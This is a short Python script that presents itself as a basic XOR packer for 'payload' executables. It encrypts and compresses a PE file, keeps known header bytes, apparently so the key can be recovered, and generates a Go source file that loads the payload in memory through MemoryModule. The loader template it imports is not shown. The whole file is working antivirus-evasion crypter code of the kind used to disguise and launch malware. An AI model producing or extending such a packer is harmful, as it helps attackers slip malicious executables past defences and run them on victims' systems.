#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import sys
import zlib
from random import randint
from struct import pack

import stub_unmanaged_go

def xor(block):
    key = randint(0,42949672)
    key_tab = pack('<L',key)
    encrypted = b""
    i = 0
    for ch in block:
        byte = key_tab[i%4]
        t = ch ^ byte
        encrypted += bytes([t])
        i += 1
    return encrypted

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Basic packer using XOR encryption', formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument('-f', '--file', type=str, required=True, help='specify the payload file')
    parser.add_argument('-t', '--type', type=str, choices=['UNMANAGED'], default='UNMANAGED', help='specify the payload type')
    args = parser.parse_args()

    print()
    print("[>] Payload file :", args.file)
    print("[>] Payload type :", args.type)
    print()

    pefile = args.file
    payload = open(pefile, 'rb').read()

    print("[*] Encrypting payload...")
    encrypted = xor(payload)

    print("[*] Compressing payload...")
    encrypted = zlib.compress(encrypted)

    print("[*] Generating source file...")
    encrypted = ''.join(format(c, '02x') for c in encrypted)
    plain = payload[128:132]
    known_bytes = ''.join(format(c, '02x') for c in plain)

    source = stub_unmanaged_go.loader.format(encrypted, known_bytes)
    repl = '''/*
#cgo CFLAGS: -IMemoryModule
#cgo LDFLAGS: MemoryModule/build/MemoryModule.a
#include "MemoryModule/MemoryModule.h"
*/
import "C"
'''
    source = source.replace('import "C"', repl)

    with open('payload.go', 'w') as f:
        f.write(source)    
    f.close()

    print()
    print("[>] You should now build payload.go")
